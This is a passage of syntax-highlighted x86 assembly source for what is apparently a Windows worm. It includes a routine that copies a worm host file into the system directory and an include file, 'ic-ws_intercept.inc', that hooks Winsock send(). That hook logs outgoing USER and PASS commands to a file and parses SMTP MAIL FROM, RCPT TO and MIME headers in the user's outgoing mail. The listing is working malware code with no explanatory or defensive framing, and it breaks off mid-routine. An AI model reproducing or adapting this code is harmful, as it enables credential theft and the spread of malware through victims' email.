    </span><span class="sc5">SetSysDirectory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SET_SYSDIR</span><span class="sc0">
    
    </span><span class="sc5">CopyWormHostFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">    
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">wsock2</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">currentdir</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ACopyFile</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">COPY_HOST_FILE</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;=========================[ ic-ws_intercept.inc ]===========================;</span><span class="sc0">

</span><span class="sc5">INTERCEPT_WSOCK</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

    </span><span class="sc5">InterceptWsockApiCall</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetDelta</span><span class="sc0">

    </span><span class="sc5">GetDelta</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetDelta</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc5">CheckStatus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; get send() socket</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">socketh</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; save it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; send() buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; size of buffer</span><span class="sc0">
    
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GET_GETPROCADDRESS_API_ADDRESS</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
      
    </span><span class="sc5">CheckForSecurityInfo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'RESU'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">StoreBufferData</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'SSAP'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">DontStore</span><span class="sc0">

    </span><span class="sc5">StoreBufferData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WRITE_TO_FILE</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    
    </span><span class="sc5">DontStore</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">             </span><span class="sc1">; monitoring==true ?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CheckMailFrom</span><span class="sc0">                </span><span class="sc1">; yes, we are</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CheckRcptTo</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CheckMimeFrom</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CheckQuit</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

    </span><span class="sc5">CheckMailFrom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; send() buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; size of buffer        </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'LIAM'</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

    </span><span class="sc5">StoreMailFromTag</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WRITE_TO_FILE</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc5">SaveMailFrom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorWhileSending</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromaddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">

    </span><span class="sc5">CheckRcptTo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; send() buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; size of buffer        </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'TPCR'</span><span class="sc0">   
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">CheckData</span><span class="sc0">

    </span><span class="sc5">AllocateRcptMemory</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcptnumber</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">SaveRcptTo</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">500h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorWhileSending</span><span class="sc0">                </span><span class="sc1">; mem for rctp email</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcpt_buffer_address</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; addresses</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">AGlobalAlloc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GETAPI</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ErrorWhileSending</span><span class="sc0">                </span><span class="sc1">; mem for size of rctp </span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcpt_size_address</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; email addresses</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> 

    </span><span class="sc5">SaveRcptTo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; store rcpt string</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcpt_buffer_address</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcpt_size_address</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; store rcpt string size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcptnumber</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; calculate total size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                    </span><span class="sc1">; of rcpts</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totalrcptsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcptnumber</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; calculate number of </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                    </span><span class="sc1">; rcpt we have</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">rcptnumber</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

    </span><span class="sc5">CheckData</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; send() buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; size of buffer        </span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ATAD'</span><span class="sc0">       
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">status</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">

    </span><span class="sc5">CheckMimeFrom</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; send() buffer</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; size of buffer</span><span class="sc0">

    </span><span class="sc5">MimeFromLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fromtag</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SearchMimeFromEnd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">MimeFromLoop</span><span class="sc0">

    </span><span class="sc5">CheckMimeTo</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        

    </span><span class="sc5">MimeToLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">totag</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SearchMimeToEnd</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">MimeToLoop</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">CheckQuit</span><span class="sc0">

    </span><span class="sc5">SearchMimeFromEnd</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc5">FromEndLoop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mimeendtag</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">SaveMimeFrom</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">FromEndLoop</span><span class="sc0">
    
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Continue</span><span class="sc0">

